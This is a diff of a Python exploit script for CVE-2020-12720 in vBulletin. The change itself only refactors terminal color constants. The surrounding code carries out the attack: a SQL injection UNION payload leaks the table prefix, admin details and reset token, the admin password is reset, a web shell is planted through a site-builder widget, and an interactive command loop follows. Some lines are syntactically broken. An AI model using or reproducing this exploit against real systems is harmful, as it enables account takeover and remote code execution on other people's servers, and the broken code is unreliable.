@@ -2,6 +2,7 @@
 import requests
 import sys
 from random import randint
+from log_colors import *
 
 # CVE-2020-12720
 # exploit
@@ -12,15 +13,6 @@ from random import randint
 # 4. ...
 # reset admin password and got shell
 class CVE2020_12720:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    PURPLE = '\033[95m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
     headers = {'X-Requested-With' : 'XMLHttpRequest'}
 
     def __init__(self, url):
@@ -39,7 +31,7 @@ class CVE2020_12720:
                 verify = False
                 )
         if 'vbulletinrcepoc' in r.text:
-            print (self.GREEN + f'host {url} is up and vulnerable' + self.ENDC)
+            print (LogColors.GREEN + f'host {url} is up and vulnerable' + LogColors.ENDC)
             return True
         return False
 
@@ -56,7 +48,7 @@ class CVE2020_12720:
                 verify = False
                 )
         table_prefix = r.json()['rawtext'].split('language')[0]
-        print(self.YELLOW + 'table prefix ' + table_prefix + self.ENDC)
+        print(LogColors.YELLOW + 'table prefix ' + table_prefix + LogColors.ENDC)
         self.table_prefix = table_prefix
 
     # get admin details
@@ -73,7 +65,7 @@ class CVE2020_12720:
                 )
 
         admin_user,admin_id,admin_email,admin_token = r.json()['rawtext'].split('|')
-        print(self.YELLOW + 'admin original token: ' + admin_token + self.ENDC)
+        print(LogColors.YELLOW + 'admin original token: ' + admin_token + LogColors.ENDC)
         self.admin_user = admin_user
         self.admin_id = admin_id
         self.admin_email = admin_email
@@ -115,7 +107,7 @@ class CVE2020_12720:
                 verify = False,
                 )
         self.captcha = r.json()['rawtext']
-        print(self.YELLOW'captcha ' + self.captcha + self.ENDC)
+        print(LogColors.YELLOW'captcha ' + self.captcha + LogColors.ENDC)
     
     # reset admin password
     def is_reset_admin_password(self):
@@ -132,13 +124,13 @@ class CVE2020_12720:
             verify = False
             )
         if not r.json()['response']==None:
-            print(self.RED + 'reset password failed' + self.ENDC)
+            print(LogColors.RED + 'reset password failed' + LogColors.ENDC)
             return False
         return True
 
     # retrieve reset token from database (captcha)
     def retrieve_reset_token(self):
-        print (self.YELLOW + 'retrieve reset token....' + self.ENDC)
+        print (LogColors.BLUE + 'retrieve reset token....' + LogColors.ENDC)
         sqli = '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,' + 
         'activationid,8,7,6,5,4,3,2,1 from ' + 
         table_prefix + 'useractivation WHERE userid = ' + 
@@ -169,8 +161,8 @@ class CVE2020_12720:
             verify = False
         )
         if not 'Logging in' in r.text:
-            print (self.RED + 'fail reset admin password :(' + self.ENDC)
-        print (self.GREEN + 'new admin credentials: ' + admin_user + ':' + new_password + self.ENDC)
+            print (LogColors.RED + 'fail reset admin password :(' + LogColors.ENDC)
+        print (LogColors.GREEN + 'new admin credentials: ' + admin_user + ':' + new_password + LogColors.ENDC)
         self.admin_password = new_password
 
     # login with new admin password
@@ -183,7 +175,7 @@ class CVE2020_12720:
             verify = False,
             )
         self.token = r.json()['newtoken']
-        print (self.GREEN + "successfully login with new admin creds" + self.ENDC)
+        print (LogColors.GREEN + "successfully login with new admin creds" + LogColors.ENDC)
 
     # activate site builder
     def activate_sitebuilder(self):
@@ -213,7 +205,7 @@ class CVE2020_12720:
             headers = self.headers,
             verify = False,
             )
-        print (self.YELLOW + 'successfully login with logintype cplogin...' + self.ENDC)
+        print (LogColors.YELLOW + 'successfully login with logintype cplogin...' + LogColors.ENDC)
 
     # save widget
     def save_widget(self):
@@ -252,7 +244,7 @@ class CVE2020_12720:
 
     # save shell
     def save_shell(self):
-        print (self.YELLOW + "saving shell..." + self.ENDC)
+        print (LogColors.BLUE + "saving shell..." + LogColors.ENDC)
         myshell = 'myshell' + str(randint(10, 100))
         data = {
             'input[ishomeroute]' : '0',
@@ -282,7 +274,7 @@ class CVE2020_12720:
             headers = self.headers, verify = False
             )
         if 'hacked by cocomelonc!' in r.text:
-            print (self.GREEN + 'got shell, hacked :)' + self.ENDC)
+            print (LogColors.GREEN + 'got shell, hacked :)' + LogColors.ENDC)
         while True:
             cmd = input('> ')
             r = self.get(
